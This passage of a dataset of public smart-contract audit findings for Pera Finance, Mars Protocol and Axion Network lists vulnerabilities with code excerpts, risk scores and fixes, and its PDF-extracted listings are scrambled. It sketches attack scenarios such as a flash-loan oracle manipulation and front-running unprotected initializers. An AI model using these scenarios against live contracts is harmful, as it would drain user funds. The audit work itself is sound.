Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "Implementing a valid access control policy is an essential step in main- taining the security of a smart contract. Access to smart-contract features, such as minting or burning tokens, and pausing contracts, are protected by access control. For instance, ownership is the most common form of access control. By default, the owner of a contract (the account that deployed it) can perform administrative tasks on the contract. Ad- ditional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or in- formation. The ownership role is helpful in a simple system, but more complex projects require more roles by using role-based access control. There should be multiple roles such as manager, minter, admin, or pauser in contracts that use a proxy contract. In the pera.sol contract, manager is the only privileged role. Manager can transfer the contract ownership, include/exclude accounts and call addLPToken() function. In conclusion, the manager role can perform too many privileged actions in the PERA smart contract. If the private key of the manager account is compromised and multi-signature was not implemented, the attacker can perform many actions such as transferring ownership or whitelist- ing/blacklisting the contract without following the principle of least privilege. Code Location: Manager role can access below functions: pera.sol Lines #173-179 15 pera.sol Lines #180-186 pera.sol Lines #187-199 pera.sol Lines #555-560 Listing 1 1 function transferOwnership ( address newOwner ) public 2 function excludeAccount ( address account ) public 3 function includeAccount ( address account ) public 4 function addLPToken ( address _addr ) public 16 Risk Level: Likelihood - 4 Impact - 4 Recommendation: We recommend using role-based access control, based upon the principle of least privilege, to lock permissioned functions using different roles. Reference:https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: SOLVED: Pera.Finance Team will use a multi-signature wallet for the deployment to the mainnet. 17 ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: High"]}, {"title": "NO TEST COVERAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "Unlike traditional software, smart contracts can not be modified unless deployed using a proxy contract. Because of the permanence, unit tests and functional testing are recommended to ensure the code works correctly Mocha and Chai are valuable tools to perform unit before deployment. tests in smart contracts. Mocha is a Javascript testing framework for creating synchronous and asynchronous unit tests, and Chai is a library with assertion functionality such as assert or expect and should be used to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 3 Impact - 3 Recommendation: We recommend performing as many test cases as possible to cover all conceivable scenarios in the smart contract. 18 Remediation Plan: UNCOVERED: Pera.Finance Team is prepared manual test coverage documenta- tion. 19 ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Medium"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "The Pera.Finance contract uses a floating pragma 0.7.5. Contracts should be deployed with the same compiler version and flags with which they have been tested. Locking the pragma helps ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that negatively affect the contract system or a pragma version too new that has not been extensively tested. Code Location: pera.sol Line #~1 Reference: https://consensys.github.io/smart-contract-best-practices/ recommendations/#lock-pragmas-to-specific-compiler-version Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider locking the pragma version whenever possible and avoid using The pragma can be locked a floating pragma in the final deployment. in the code by removing the caret () and by specifying the version in the Truffle configuration file truffle-config.js or hardhat.config.js if using the HardHat framework. 20 truffle-config.js hardhat.config.js Remediation Plan: SOLVED: Pera.Finance Team locked Pragma Version to 0.6.12 21 ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Low"]}, {"title": "POSSIBLE RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "Calling external contracts is dangerous if functions or variables are used after the external call. The transfer function is executed before checking the totalRewards value, potentially allowing an attacker to hijack the control flow using an external contract implementing a recursive call. Code Location: contract.sol Line #526-545 Risk Level: Likelihood - 2 Impact - 3 Recommendation: External calls should be at the end of the function to prevent an attacker from taking over the control flow. Check the totalRewards before calling the transfer function. The totalStakedLP and usersLP variables should be called before invoking _transfer(address(this), msg.sender, usershareLP 22 .div(decimalLossLP));. Remediation Plan: SOLVED: External calls have been moved to the end by the Pera.Finance Team. 23 ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Low"]}, {"title": "DIVIDE BEFORE MULTIPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "In Solidity, integer division might truncate. Performing multiplication before division can sometimes avoid a loss of precision. In this au- dit, multiple instances were found where division is performed before multiplication in the contract. Code Location: contract.sol Line #533 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Perform multiplication operations before division to preserve the preci- sion of values for non-floating data types. A sample solution is provided below. 24 Listing 2 1 ERC20 ( lpTokenAddress ). transfer ( msg . sender , ( usersLP [ msg . sender ]. liq . mul (96) ). div (100) ); 25 Remediation Plan: SOLVED: In the updated contract code, the Multiplication operation is performed before division. ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Low"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "Pera.Finance contract uses one of the latest pragma version (0.7.5) which was released on November 18, 2020. The latest pragma version (0.8.2) was released in March 2021. Many pragma versions have been lately released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases Code Location: pera.sol Line #~1 Risk Level: Likelihood - 1 Impact - 3 Recommendation: In the Solitidy Github repository, there is a json file where are all bugs finding in the different compiler versions. No bugs have been found in > 0.7.3 versions but very few in 0.7.0 -- 0.7.3. So, the latest tested and stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 26 is widely used by Solidity developers and has been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/ bugs_by_version.json SOLVED: Pera.Finance Team locked Pragma Version to 0.6.12 27 ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Low"]}, {"title": "FOR LOOP OVER DYNAMIC ARRAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Code Location: pera.sol Line #~189 pera.sol Line #~200 28 pera.sol Line #~265 pera.sol Line #~291 pera.sol Line #~322-323 29 pera.sol Line #~342 pera.sol Line #~351 pera.sol Line #~487 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. 30 SOLVED: Pera.Finance Team completed changes to reduce the number of cycles. 31 ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: pera.sol Line #~263 pera.sol Line #~404 Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. SOLVED: Pera.Finance Team marked functions as an external. 33 3.10 (HAL-10) DOCUMENTATION - INFORMATIONAL ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Informational"]}, {"title": "SOME PRICE SOURCES DO NOT PREVENT MANIPULATION OF ASSETS PRICE IN THE ORACLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "If an asset is created with execute_set_asset function in contracts/mars- oracle/src/contract.rs using AstroportSpot or AstroportLiquidityToken as price source, an attacker can create an imbalance in its corresponding pool in Astroport AMM protocol and obtain considerable profits at expenses of Mars markets. Below is described an attack scenario for an asset created with Astro- portSpot as price source. Initial balance for the pool is 8M tokens and 2M UST. Attack scenario: 1. Attacker obtains 3M UST (flash loan or whale) and swap them in Astroport AMM protocol to imbalance the Token-UST pool. 2. Attacker obtains 4.8M tokens in return for the swap and deposits them as collateral in mars-red-bank contract. 3. Attacker can borrow 5.6M UST from mars-red-bank contract. 4. Attacker returns flash loan and obtains 2.6M UST as profit at ex- penses of Mars market. A proof of concept video showing how to exploit this security issue is included in the report. 20 Code Location: If an asset is created with AstroportSpot as price source, its price is queried with AstroportQueryMsg::Simulation message, using a potentially imbalanced Astroport pool as information source. Listing 1: contracts/mars-oracle/src/contract.rs (Line 240) 239 PriceSourceChecked :: AstroportSpot { pair_address } = > { 240 241 } query_astroport_spot_price (& deps . querier , & pair_address ) Listing 2: contracts/mars-oracle/src/contract.rs (Line 403) 400 let response : SimulationResponse = 401 402 403 contract_addr : pair_address . to_string () , msg : to_binary (& AstroportQueryMsg :: Simulation { querier . query (& QueryRequest :: Wasm ( WasmQuery :: Smart { offer_asset }) ?, }) ) ?; 404 405 406 Ok ( Decimal :: from_ratio ( 407 408 409 )) response . return_amount + response . commission_amount , PROBE_AMOUNT , If an asset is created with AstroportLiquidityToken as price source, its price is queried using a potentially imbalanced Astroport pool as information source. Listing 3: contracts/mars-oracle/src/contract.rs (Lines 291,295,298) let pool = query_astroport_pool (& deps . querier , & pair_address ) ?; 287 PriceSourceChecked :: AstroportLiquidityToken { pair_address } => { 288 289 290 291 let asset0 : Asset = (& pool . assets [0]. info ). into () ; let asset0_price = query_asset_price ( deps , env . clone () , asset0 . get_reference () ) ?; let asset0_value = asset0_price * pool . assets [0]. amount ; let asset1 : Asset = (& pool . assets [1]. info ). into () ; let asset1_price = query_asset_price ( deps , env , asset1 . 292 293 294 295 21 get_reference () ) ?; let asset1_value = asset1_price * pool . assets [1]. amount ; let price = Decimal :: from_ratio ( asset0_value + asset1_value , pool . total_share ); Ok ( price ) 296 297 298 299 300 } Risk Level: Likelihood - 4 Impact - 5 Recommendation: Remove AstroportSpot and AstroportLiquidityToken as price sources for execute_set_asset and query_asset_price functions. As long as those price sources exist in the code (even if not frequently used), they are potential doors for extremely harmful attacks, i.e.: draining funds from Mars markets. Remediation plan: RISK ACCEPTED: The Mars team accepted the risk for this finding. They also stated that the mentioned price sources are useful when testing currently and will be comprehensive in the context of the risk that those price sources are not recommended for production. Furthermore, they will consider removing it entirely in future versions of the protocol if the community agrees. 22 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: High"]}, {"title": "LIQUIDATION CAN TOTALLY CORRUPT THE VALUES OF TOTAL DEBT, INDEXES AND RATES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_liquidate function in contracts/mars-red-bank/src/contract.rs does not handle adequately the cases where debt and collateral are the same asset because changes on debt_market are overridden by changes on collateral_market. The values that can be totally corrupted on debt_market are the following:  debt_total_scaled  borrow_index  liquidity_index  indexes_last_updated  borrow_rate  liquidity_rate Proof of concept: 1. User liquidates using the same asset for collateral and debt: 23 2. The value of debt_total_scaled is updated with the amount repaid: 3. Changes on debt_market are overridden by changes on collateral_market because debt_asset_reference and collateral_asset_reference have the same value: 4. When testing, it was identified that value of debt_total_scaled had not been updated correctly: Code Location: execute_liquidate function receive collateral_asset and deb_asset as ar- guments of Asset type. Listing 4: contracts/mars-red-bank/src/contract.rs (Lines 1204,1205) 1199 pub fn execute_liquidate ( 1200 1201 1202 1203 1204 1205 mut deps : DepsMut , env : Env , _info : MessageInfo , liquidator_address : Addr , collateral_asset : Asset , debt_asset : Asset , 24 user_address : Addr , sent_debt_asset_amount : Uint128 , receive_ma_token : bool , 1206 1207 1208 1209 ) -> Result < Response , ContractError > { 1210 1211 let block_time = env . block . time . seconds () ; let ( debt_asset_label , debt_asset_reference , debt_asset_type ) = debt_asset . get_attributes () ; Changes on debt_market are overridden in contracts storage by changes on collateral_market. Listing 5: contracts/mars-red-bank/src/contract.rs (Lines 1416-1419) 1414 // save markets 1415 MARKETS . save ( deps . storage , debt_asset_reference . as_slice () , & debt_market ) ?; 1416 MARKETS . save ( 1417 1418 1419 deps . storage , collateral_asset_reference . as_slice () , & collateral_market , Risk Level: Likelihood - 5 Impact - 4 Recommendation: Update the logic of execute_liquidate function to handle correctly the cases where debt and collateral are the same asset. Remediation plan: SOLVED: The issue was fixed in the following commits:  82c6649db9536fffa67754c151d24eb97b109bc2  20d493c4b6b68586dedf43aa0de69989bc587b62 25 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: High"]}, {"title": "SLASH EVENTS CAN BE OVERWRITTEN WHEN TRANSFERRING MARS TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_transfer_mars function in contracts/mars-staking/src/contract.rs allows owner to transfer Mars tokens to some recipient. Every time this operation is done, a slash event is created with env.block.height as key and slash_percentage as value. When users claim, slash events are applied in chronological order to adjust and reduce claim amount to the real value. However if execute_transfer_mars function is called two or more times during the same block, previous slash events will be overwritten by the new ones. As a consequence, users will be able to claim more at expenses of the mars-staking contract funds. Code Location: Listing 6: contracts/mars-staking/src/contract.rs (Lines 381-382) 377 let slash_percentage = Decimal :: from_ratio ( amount , total_mars_in_staking_contract ); 378 379 SLASH_EVENTS . save ( 380 381 382 383 ) ?; deps . storage , U64Key :: new ( env . block . height ) , & { slash_percentage }, Risk Level: Likelihood - 3 Impact - 5 26 Recommendation: Update the logic of execute_transfer_mars function to throw error messages if a slash event with the same key (current env.block.height) has already been created before. Remediation plan: SOLVED: The issue was fixed in commit 7b5fbcc9301b3cbb195098a2a6edb143abb166fc. 27 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: High"]}, {"title": "MARS TOKENS CAN GET LOCKED IN CONTRACT WHEN UNSTAKING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "a user calls execute_unstake When contracts/mars- staking/src/contract.rs with a recipient address in upper case (e.g.: TERRA1KG. . . XNL8), the claim is stored in CLAIMS with the upper case address as a key. function in As a consequence, when the recipient tries to claim with execute_claim function, he wont be able to do it because the claim is loaded from CLAIMS using info.sender as a key, which is always in lower case (e.g.: terra1kg. . . xnl8), i.e.: his Mars tokens get locked in contract forever. Code Location: If recipient address is in upper case, execute_unstake function will store the claim in CLAIMS with the upper case address as a key. Listing 7: contracts/mars-staking/src/contract.rs (Lines 268,273) 267 let recipient = option_recipient . unwrap_or_else (|| staker . clone () ); let recipient_addr = deps . api . addr_validate (& recipient ) ?; if CLAIMS . may_load ( deps . storage , & recipient_addr ) ?. is_some () { return Err ( ContractError :: UnstakeActiveClaim {}) ; } CLAIMS . save ( deps . storage , & recipient_addr , & claim ) ?; 268 269 270 271 272 273 28 execute_claim function loads claim from CLAIMS using info.sender as a key, which is always in lower case. Listing 8: contracts/mars-staking/src/contract.rs (Line 307) 301 pub fn execute_claim ( 302 303 304 305 306 ) -> Result < Response , ContractError > { 307 deps : DepsMut , env : Env , info : MessageInfo , option_recipient : Option < String >, let mut claim = CLAIMS . load ( deps . storage , & info . sender ) ?; Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of execute_unstake function to turn address into lower case for recipient. Remediation plan: SOLVED: The issue was fixed in commit 14fdcc2c207f6528e31952f33eb36c32a4a00bf4. 29 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: High"]}, {"title": "TOTAL MARS FOR CLAIMERS IS MISCALCULATED WHEN TRANSFERRING MARS TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_transfer_mars function in contracts/mars-staking/src/contract.rs allows owner to transfer Mars tokens to some recipient. Every time this operation is done, total_mars_for_claimers is updated, but its value is wrongly calculated. As a consequence, in some scenarios legitimate users will not be able to claim from mars-staking contract as expected and operation will panic because of underflow. Code Location: Listing 9: contracts/mars-staking/src/contract.rs (Line 386) 377 let slash_percentage = Decimal :: from_ratio ( amount , total_mars_in_staking_contract ); deps . storage , U64Key :: new ( env . block . height ) , & SlashEvent { slash_percentage }, 378 379 SLASH_EVENTS . save ( 380 381 382 383 ) ?; 384 385 let mut global_state = GLOBAL_STATE . load ( deps . storage ) ?; 386 global_state . total_mars_for_claimers = global_state . total_mars_for_claimers * slash_percentage ; 387 GLOBAL_STATE . save ( deps . storage , & global_state ) ?; Risk Level: Likelihood - 4 Impact - 4 30 Recommendation: Fix the logic of execute_transfer_mars function to multiply the value of current total_mars_for_claimers by 1 - slash_percentage when trying to update its value. Remediation plan: SOLVED: The issue was fixed in commit 956c935553d02bbc7f2a3d0198f312d15e75420f. 31 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: High"]}, {"title": "TOKENS GET LOCKED WHEN TRANSFERRING TO UPPER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When accounts transfer / send mars-ma-token or mars-xmars-token to a recipient address in upper case (e.g.: TERRA1KG. . . XNL8), the new balance is stored in BALANCES with the upper case address as a key. As a consequence, when the recipient tries to use his tokens, he wont be able to do it because the balance is loaded from BALANCES using info. sender as a key, which is always in lower case (e.g.: terra1kg. . . xnl8), i.e.: his tokens get locked forever. The affected smart contracts are the following:  mars-ma-token  mars-xmars-token  mars-red-bank  mars-staking Code Location: Listing 10: Resources affected 1 2 mars - ma - token : execute_transfer ( recipient_unchecked ) mars - ma - token : execute_transfer_on_liquidation ( recipient_unchecked ) 3 4 5 6 7 8 9 10 mars - ma - token : execute_send ( contract_unchecked ) mars - ma - token : execute_transfer_from ( recipient ) mars - ma - token : execute_send_from ( contract ) mars - xmars - token : execute_transfer ( recipient ) mars - xmars - token : execute_send ( contract ) mars - xmars - token : execute_transfer_from ( recipient ) mars - xmars - token : execute_send_from ( contract ) mars - red - bank : execute_liquidate ( liquidator_address ) 32 11 12 mars - staking : execute_claim ( option_recipient ) mars - staking : execute_transfer_mars ( recipient_unchecked ) Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of functions mentioned above to turn recipient addresses into lower case. Remediation plan: PENDING: The Mars team stated that in the short term they would analyze how to address this issue comprehensively on the protocol. 33 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: High"]}, {"title": "POSSIBILITY TO LIQUIDATE WHEN COLLATERAL ASSET IS UNSET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_liquidate function in contracts/mars-red-bank/src/contract.rs does not restrict that liquidations are done using only assets set as collaterals. As a consequence, users are able to liquidate debts using even collaterals that borrowers have explicitly unset, which could affects borrowers lending strategy. Code Location: execute_liquidate function does not verify if collateral_asset is set as collateral. Listing 11: contracts/mars-red-bank/src/contract.rs 1232 let ( collateral_asset_label , collateral_asset_reference , collateral_asset_type ) = collateral_asset . get_attributes () ; 1233 1234 1235 let mut collateral_market = 1236 MARKETS . load ( deps . storage , collateral_asset_reference . as_slice () ) ?; return Err ( ContractError :: MarketNotActive { 1237 1238 if !collateral_market . active { 1239 1240 1241 1242 } 1243 1244 // check if user has available collateral in specified collateral asset : collateral_asset_label , }) ; asset to be liquidated 1245 let user_collateral_balance_scaled = cw20_get_balance ( 1246 1247 1248 & deps . querier , collateral_market . ma_token_address . clone () , user_address . clone () , 34 1249 ) ?; 1250 let user_collateral_balance = get_underlying_liquidity_amount ( 1251 1252 1253 1254 ) ?; 1255 if user_collateral_balance . is_zero () { return Err ( ContractError :: 1256 user_collateral_balance_scaled , & collateral_market , block_time , CannotLiquidateWhenNoCollateralBalance {}) ; 1257 } Risk Level: Likelihood - 4 Impact - 3 Recommendation: the logic Update if execute_liquidate collateral_asset parameter is set as collateral. Otherwise, it should throw an error message. function verify of to Remediation plan: SOLVED: The issue was fixed in commit 256559bb553cbffe6683a596f03a2d4eb2bd0a95. 35 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: Medium"]}, {"title": "NO MINIMUM THRESHOLD FOR SOME PARAMETERS OF COUNCIL CONFIGURATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "from function validate not validate that proposal_required_threshold, proposal_effective_delay or proposal_expiration_period from Config has a minimum threshold, which could generate the following situations: packages/mars-core/src/council.rs does  Proposals can be passed without reaching the majority of votes.  Malicious changes proposed through voting could even be executed immediately, not allowing legitimate users to react timely.  Proposals could never be executed if expiration period is not ap- propriately set. Code Location: Listing 12: packages/mars-core/src/council.rs (Lines 32,42) Self :: less_or_equal_one (& self . proposal_required_quorum ) , \" proposal_required_quorum \" , ( let conditions_and_names = vec! [ 31 pub fn validate (& self ) -> Result <() , MarsError > { 32 33 34 35 36 37 38 39 40 41 42 43 } ]; all_conditions_valid ( conditions_and_names ) ) , ( ) , Self :: less_or_equal_one (& self . proposal_required_threshold ) , \" proposal_required_threshold \" , 36 Risk Level: Likelihood - 1 Impact - 5 Recommendation: Update the logic of validate function to ensure the following conditions: 1. proposal_required_threshold is greater or equal than 0.5. 2. proposal_expiration_period exceeds 0. 3. proposal_effective_delay is greater or equal than a minimum threshold that allows Mars users to act timely against any issue that the protocol could have when changes are made. The following are some examples of timelocks used on other protocols:  Uniswap: 48-hours timelock  Compound: 48-hours timelock Remediation plan: PARTIALLY SOLVED: The issue for proposal_required_threshold was fixed in the following commits:  4c64bd62088be852d55b94a956884d0ab185c421  1f78cc5d4f98cb37548ca6ca1d63029f231ae404 The Mars team also claimed that they will consider adding the remaining restrictions in future versions of the protocol. 37 ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: Medium"]}, {"title": "LOAN LIMIT CAN BE UPDATED FOR USERS WITH COLLATERALIZED DEBTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "execute_update_uncollateralized_loan_limit function in contracts/mars- red-bank/src/contract.rs allows updating the loan limit for users with collateralized debts. As a consequence, their debts would be reset (amount_scaled = 0) without have been repaid or liquidated by someone else, which greatly affects contracts funds. It is worth noting that likelihood for this to happen is limited because mars-red-bank contract is intended to be owned by governance indefinitely, who is the responsible one for this operation. Code Location: Listing 13: contracts/mars-red-bank/src/contract.rs (Lines 636-639) deps . storage , ( asset_reference . as_slice () , & user_address ) , & new_limit , 626 UNCOLLATERALIZED_LOAN_LIMITS . save ( 627 628 629 630 ) ?; 631 632 DEBTS . update ( 633 634 635 636 637 638 639 640 deps . storage , ( asset_reference . as_slice () , & user_address ) , | debt_opt : Option < Debt >| -> StdResult <_ > { let mut debt = debt_opt . unwrap_or ( Debt { amount_scaled : Uint128 :: zero () , uncollateralized : false , }) ; // if limit == 0 then uncollateralized = false , otherwise uncollateralized = true 641 642 debt . uncollateralized = !new_limit . is_zero () ; Ok ( debt ) 38 Risk Level: Likelihood - 2 Impact - 4 Recommendation: Update the logic of execute_update_uncollateralized_loan_limit function to restrict that loan limit can be updated only for users with no col- lateralized debts. Otherwise, it should throw an error message. Remediation plan: SOLVED: The issue was fixed in commit bc2936b3953ef0006e0511164170ec8aff98746a. 39 3.10 (HAL-10) RESTRICTION TO NOT SWAP MARS TOKENS CAN BE BYPASSED - MEDIUM ", "labels": ["Halborn", "Mars_Protocol_Core_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "FRONT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "of declaration function initialize(address _manager, address The _migrator).. is used in almost all scope contracts. It is required a call to the initialize function after deploying it to initialize the manager, migrator, and external_caller_role roles. There is no require checking within the initialize function. There are functions that can be front-run, allowing an attacker to incorrectly initialize the contracts. Attack scenario: 1. Deployed the contract from 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 2. Calling initialize function from 0x617F2E2fD72FD9D5503197092aC168c91465E7f2 15 3. Call from owner address (0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2) is denied after malicious initialization Code Location: Listing 2: VentureCapital.sol (Lines 147,148,149,150,152) 257 258 259 260 261 262 263 function initialize ( address _manager , address _migrator ) public initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( EXTERNAL_CALLER_ROLE , _manager ); _setupRole ( EXTERNAL_CALLER_ROLE , _migrator ); } 16 Listing 3: Accelerator.sol (Lines 503,504) 500 501 502 503 504 function initialize ( address _migrator , address _manager ) external initializer { /* * Setup roles and addresses */ _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( MANAGER_ROLE , _manager ); } Listing 4: BPD.sol 116 117 118 119 function initialize ( address _migrator , address _stakeManager ) external initializer { _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeManager ); } Listing 5: StakeBurner.sol 287 288 289 290 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 6: StakeMinter.sol 213 214 215 216 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 7: StakeReminter.sol 85 86 87 88 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } 17 Listing 8: StakeToken.sol 153 154 155 156 157 158 159 160 161 162 163 164 165 166 function initialize ( address _manager , address _migrator , string memory name , string memory symbol ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); enabled = true ; // Initially Enabled transferEnabled = false ; // Initially disabled __ERC721_init ( name , symbol ); __ERC721Enumerable_init () ; } Listing 9: StakeUpgrader.sol 151 152 153 154 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 10: StakeCustodian.sol 45 46 47 48 49 50 51 52 53 54 55 function initialize ( address _migrator , address _stakeMinter , address _stakeBurner , address _stakeUpgrader ) external initializer { _setupRole ( MIGRATOR_ROLE , _migrator ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeMinter ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeBurner ); _setupRole ( EXTERNAL_CALLER_ROLE , _stakeUpgrader ); } 18 Listing 11: StakeManager.sol 631 632 633 634 function initialize ( address _manager , address _migrator ) external initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); } Listing 12: Token.sol 46 47 48 49 50 51 52 53 54 55 56 57 58 function initialize ( address _manager , address _migrator , string memory _name , string memory _symbol ) public initializer { _setupRole ( MANAGER_ROLE , _manager ); _setupRole ( MIGRATOR_ROLE , _migrator ); __ERC20_init ( _name , _symbol ); /* * I do not understand this */ swapIsOver = false ; } Listing 13: DataReader.sol 46 47 48 49 50 51 52 53 54 55 56 57 58 59 function initialize ( address _manager , address _staking , address _stakingV1 , address _auction , address _auctionV1 ) public initializer { _setupRole ( MANAGER_ROLE , _manager ); staking = IStakingDataV2 ( _staking ); stakingV1 = IStakingV1 ( _stakingV1 ); auction = IAuctionDataV2 ( _auction ); auctionV1 = IAuctionV1 ( _auctionV1 ); } 19 Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to declare a constructor instead of an initialize function to set up roles at the time of deployment to mitigate the issue. Otherwise, add a require statement to each initialize function to verify that the function is called by the contract owner only, and post verification roles should be setup. Otherwise, setting the owner in the contracts constructor to the msg.sender and adding the onlyOwner modifier to all initializers would be enough for access control. Another solution is using a factory pattern that 